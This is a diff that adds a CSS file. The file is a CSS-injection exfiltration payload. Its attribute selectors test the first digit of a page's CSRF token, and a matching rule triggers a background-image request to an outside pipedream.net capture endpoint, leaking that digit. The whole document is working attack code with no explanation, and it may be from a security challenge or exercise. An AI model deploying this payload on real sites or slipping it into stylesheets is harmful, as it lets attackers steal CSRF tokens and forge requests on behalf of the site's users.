@@ -1,0 +1,27 @@
+input[name=csrf][value^=1] ~ * {
+    background-image:url(https://eo4adedl4xfs7hf.m.pipedream.net/1)
+}
+input[name=csrf][value^=2] ~ * {
+    background-image:url(https://eo4adedl4xfs7hf.m.pipedream.net/2)
+}
+input[name=csrf][value^=3] ~ * {
+    background-image:url(https://eo4adedl4xfs7hf.m.pipedream.net/3)
+}
+input[name=csrf][value^=4] ~ * {
+    background-image:url(https://eo4adedl4xfs7hf.m.pipedream.net/4)
+}
+input[name=csrf][value^=5] ~ * {
+    background-image:url(https://eo4adedl4xfs7hf.m.pipedream.net/5)
+}
+input[name=csrf][value^=6] ~ * {
+    background-image:url(https://eo4adedl4xfs7hf.m.pipedream.net/6)
+}
+input[name=csrf][value^=7] ~ * {
+    background-image:url(https://eo4adedl4xfs7hf.m.pipedream.net/7)
+}
+input[name=csrf][value^=8] ~ * {
+    background-image:url(https://eo4adedl4xfs7hf.m.pipedream.net/8)
+}
+input[name=csrf][value^=9] ~ * {
+    background-image:url(https://eo4adedl4xfs7hf.m.pipedream.net/9)
+}
